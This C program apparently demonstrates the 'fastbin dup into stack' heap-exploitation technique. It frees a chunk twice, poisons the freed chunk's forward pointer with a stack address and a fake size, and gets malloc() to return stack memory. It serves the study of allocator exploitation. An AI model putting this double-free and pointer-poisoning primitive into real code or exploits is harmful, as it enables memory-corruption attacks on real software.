#include <stdio.h>
#include <stdlib.h>

//Using Double Free Bug to allocate stack!
//Stack should have same size of fast chunk 
int main()
{
	
	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	
	free(a);
	free(b);
	free(a);

	
	unsigned long long *d = malloc(8);

	int *e=malloc(8);
	
	
	stack_var = 0x20;
	*d = (unsigned long long) (((char*)&stack_var) - 8);
	int *f=malloc(8);
	int *g=malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", e);
	fprintf(stderr, "3rd malloc(8): %p\n", f);
	fprintf(stderr, "4th malloc(8): %p\n", g);
}